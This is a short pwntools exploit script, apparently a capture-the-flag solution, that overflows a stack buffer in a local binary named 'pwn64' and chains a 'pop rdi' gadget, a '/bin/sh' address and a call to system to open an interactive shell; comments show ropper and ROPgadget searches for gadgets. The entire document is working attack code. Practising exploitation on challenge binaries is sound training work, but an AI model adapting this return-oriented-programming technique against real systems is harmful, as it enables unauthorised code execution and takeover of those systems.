from pwn import *
p = process('pwn64')

# ropper --file xxxx --search "int 0x80"
# ROPgadget --binary ret2syscall --only 'pop|ret'
poprdi  = 0x4011be
binsh   = 0x404050
system  = 0x4012B7

text = b'a' * (0x50 + 8) + p64(poprdi) + p64(binsh) + p64(system)

p.recvuntil('age?\n')
p.sendline('128')
p.recvuntil('overflow!\n')
p.sendline(text)
p.interactive()

